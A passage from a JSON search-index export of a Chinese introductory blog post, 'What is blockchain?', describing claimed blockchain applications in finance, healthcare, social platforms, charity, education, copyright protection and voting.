例如，传统的证券交易需要由证券公司、银行、中央结算机构以及交易所多方协同工作才能共同完成，导致效率低、成本高，容错率也很低，一个环节出现漏洞就会造成巨大的问题和损失。然而，在区块链技术应用在证券交易中后，各参与方便可独立地完成整个结算流程。 再比如，跨境支付是金融领域的重要组成部分，但效率低、速度慢。然而，在区块链点对点的技术应用到跨境支付领域后，汇款通道变得透明，交易历史数据可追溯，让收款方、汇款方都安心，也大大提高了效率和速度。 ","date":"2018-03-02","objectID":"/posts/what-is-blockchain.html:7:1","tags":["基础知识","区块链"],"title":"什么是区块链(Blockchain)?","uri":"/posts/what-is-blockchain.html"},{"categories":["基础知识"],"content":"7.2 医疗 区块链在医疗信息安全与隐私保护方面有着极其重要的应用。在当前中心化的信息管理系统下，各种黑客攻击和系统漏洞导致信息安全问题极大，而医疗领域存储着很多用户的私密资料，数据泄露问题一旦发生，就会造成极其严重的后果。因此，医疗领域需要森严的安全措施保护数据。 区块链的去中心化的特点则有针对性地解决了这个问题。去中心化的病人医疗健康信息数据存储与共享的建立大大有益于医疗行业。 ","date":"2018-03-02","objectID":"/posts/what-is-blockchain.html:7:2","tags":["基础知识","区块链"],"title":"什么是区块链(Blockchain)?","uri":"/posts/what-is-blockchain.html"},{"categories":["基础知识"],"content":"7.3 内容社交平台 目前，很多内容社交平台都是中心化的，如抖音、微博、微信公众号等，中心化的意思是中心决定节点，节点必须依赖中心，节点离开了中心就无法生存。因此，平台需要做的就是提供平台，然后用户通过平台为自己带来流量，进而利用流量获利。 区块链技术可以给内容社交平台注入新的血液，它利用分布式管理将平台去中心化，在新的去中心化系统中，每个人都是一个节点，任何人也都可以成为一个中心。这样平台可以将权力分散到用户身上，用户也可以贡献出自己的力量并获得平台的奖励和经济回报。 ","date":"2018-03-02","objectID":"/posts/what-is-blockchain.html:7:3","tags":["基础知识","区块链"],"title":"什么是区块链(Blockchain)?","uri":"/posts/what-is-blockchain.html"},{"categories":["基础知识"],"content":"7.4 慈善 人们捐赠爱心、传递善意是一件美好而伟大的事，但是层出不穷的慈善黑幕事件给这件美好的事情增添了污点。慈善体系的不透明为这类事情提供了契机，也引发捐赠者对这个行业的担忧。 区块链技术可以大大提高慈善领域的信息透明度，让捐赠者有权对慈善体系和流程进行监督，进而鼓励捐赠者放心捐助，形成良性循环，改善慈善事业。 如利用区块链技术建立公开透明的、不可篡改的信息体系，从善款的流向到受捐赠者的身份确认，建立慈善领域的监督问责机制，增加捐赠者对机构的信任和信心，同时也保护了捐赠方和受赠方的隐私。 ","date":"2018-03-02","objectID":"/posts/what-is-blockchain.html:7:4","tags":["基础知识","区块链"],"title":"什么是区块链(Blockchain)?","uri":"/posts/what-is-blockchain.html"},{"categories":["基础知识"],"content":"7.5 教育 教育系统中，学历认证一直十分重要，人工验证纸质版证书的效率低下，且纸质版证书有丢失的风险。区块链由所有参与者进行维护且不可篡改，使用区块链存储和保护学生的证明文件，可以简化流程并提高学历认证的效率。 学生的学历信息和档案记录等全部存储在区块链中，当学生需要证明自己学历和相关信息时，只需让对方加入链并看见自己的文件即可。同时，区块链具有去中心化的特点，证书不会因为中心机构关闭而消失，数据永远存在。 ","date":"2018-03-02","objectID":"/posts/what-is-blockchain.html:7:5","tags":["基础知识","区块链"],"title":"什么是区块链(Blockchain)?","uri":"/posts/what-is-blockchain.html"},{"categories":["基础知识"],"content":"7.6 版权保护 版权保护在中国一直是大家十分关注且亟待解决的问题。但是版权登记成本较高、效率低，以及版权保护的效率低、效果差的问题一直存在。将区块链技术应用到版权保护领域，对版权所有者和其版权产出的数据进行存储，可以实现对所有权的溯源，从而达到保护版权的目的。 更高效、便捷、有效的保障内容生产者权益的方式，能激励更多的创作者继续创造新的内容，创作者通过将作品记录于区块链，实现对原创作品的追踪，一旦发生纠纷或者盗用事件，可以尽快展开进一步的措施。 ","date":"2018-03-02","objectID":"/posts/what-is-blockchain.html:7:6","tags":["基础知识","区块链"],"title":"什么是区块链(Blockchain)?","uri":"/posts/what-is-blockchain.html"},{"categories":["基础知识"],"content":"7.7 投票 在部分国家，投票被用于进行总统选举。投票本着公平公正、少数服从多数的原则，但是由于系统透明度低，投票结果容易引起部分参与者的怀疑。区块链去中心化和透明化的特点正好可以有针对性地解决这个问题，使投票透明、真实性强。 ","date":"2018-03-02","objectID":"/posts/what-is-blockchain.html:7:7","tags":["基础知识","区块链"],"title":"什么是区块链(Blockchain)?","uri":"/posts/what-is-blockchain.html"}]